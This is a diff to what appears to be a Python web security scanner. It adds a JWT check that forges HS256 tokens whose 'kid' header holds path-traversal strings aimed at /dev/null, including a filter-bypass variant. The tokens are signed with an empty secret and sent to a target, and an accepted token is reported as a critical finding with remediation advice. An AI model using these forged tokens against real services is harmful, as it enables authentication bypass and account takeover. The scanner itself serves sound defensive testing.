@@ -2008,6 +2008,29 @@ def _jwt_forge_hs256(payload, secret):
     return f"{h}.{p}.{_b64url_encode(sig)}"
 
 
+# kid path-traversal targets: if a verifier naively builds a filesystem
+# path from the token's own "kid" header to look up the signing key (a
+# real, well-documented JWT implementation bug), pointing kid at a
+# predictable file — classically /dev/null, which always reads as zero
+# bytes — lets an attacker sign with a KNOWN secret (empty bytes) instead
+# of the real one. Several traversal depths and one filter-bypass variant
+# are tried since the real key-lookup directory's depth is unknown.
+_JWT_KID_NULL_CANDIDATES = [
+    "../../../../../../../../dev/null",
+    "../../../../dev/null",
+    "../../dev/null",
+    "....//....//....//....//dev/null",
+]
+
+
+def _jwt_forge_hs256_kid(payload, kid, secret_bytes):
+    header = {"alg": "HS256", "typ": "JWT", "kid": kid}
+    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
+    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
+    sig = hmac.new(secret_bytes, f"{h}.{p}".encode(), hashlib.sha256).digest()
+    return f"{h}.{p}.{_b64url_encode(sig)}"
+
+
 def _run_jwt_mode(args, console, eng, jwt_token):
     Panel, Rule, Table, Prompt, Confirm, Syntax, box = _rich()
     if not HAS_REQUESTS:
@@ -2121,10 +2144,29 @@ def _run_jwt_mode(args, console, eng, jwt_token):
             ))
             break  # one cracked secret is enough evidence
 
+    if not cracked_secret:
+        for candidate in _JWT_KID_NULL_CANDIDATES:
+            forged = _jwt_forge_hs256_kid(payload, candidate, b"")
+            if _looks_authenticated(_try_token(forged)):
+                findings.append((
+                    f"kid header path traversal ('{candidate}')", forged, "critical",
+                    f"Setting the JWT header's \"kid\" field to a path-traversal string "
+                    f"('{candidate}') and signing with an empty-bytes secret was accepted — "
+                    f"consistent with the verifier building a filesystem path directly from "
+                    f"the token's own kid header to look up the signing key, with no "
+                    f"containment check, letting the traversal reach a predictable "
+                    f"zero-byte file (classically /dev/null) whose content is a known, "
+                    f"guessable \"secret\".",
+                    "Never build a filesystem path (or any lookup key) directly from a "
+                    "client-supplied JWT header. Validate kid against an allow-list of known "
+                    "key identifiers server-side before using it for anything.",
+                ))
+                break  # one accepted traversal candidate is enough evidence
+
     if not findings:
-        console.print("[green]No alg=none bypass and no match against the built-in weak-secret "
-                      "list. This does not mean the JWT implementation is secure — only that "
-                      "these two specific, fast checks didn't find anything.[/green]")
+        console.print("[green]No alg=none bypass, weak-secret match, or kid path-traversal "
+                      "acceptance found. This does not mean the JWT implementation is secure "
+                      "— only that these specific, fast checks didn't find anything.[/green]")
         return
 
     for title_suffix, forged_token, severity, description, remediation in findings:
